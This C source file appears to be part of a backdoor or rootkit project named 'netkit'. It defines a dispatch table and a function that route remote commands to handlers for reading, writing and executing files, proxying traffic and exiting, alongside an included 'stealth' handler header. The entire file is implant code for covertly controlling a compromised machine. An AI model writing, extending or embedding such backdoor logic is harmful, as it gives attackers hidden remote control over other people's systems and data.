#include "handlers/file.h"
#include "handlers/socket.h"
#include "handlers/stealth.h"

static int (*COMM_HANDLERS[])(const u8*, size_t, u8**, size_t*) = {
    cmd_handle_file_read,
    cmd_handle_file_write,
    cmd_handle_file_exec,
    cmd_handle_proxy,
    cmd_handle_exit
};


static inline int cmd_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 cmd_id;

    if (req_buflen < 1)
        return -EINVAL;

    cmd_id = req_buf[0];
    if (cmd_id < 0 || cmd_id >= sizeof(COMM_HANDLERS) / sizeof(*COMM_HANDLERS))
        return -EDOM;

    NETKIT_LOG("[*] processing cmd: %hhd\n", cmd_id);

    // allow OOB ptr with size 0
    return COMM_HANDLERS[cmd_id](req_buf + 1, req_buflen - 1, res_buf, res_buflen);
}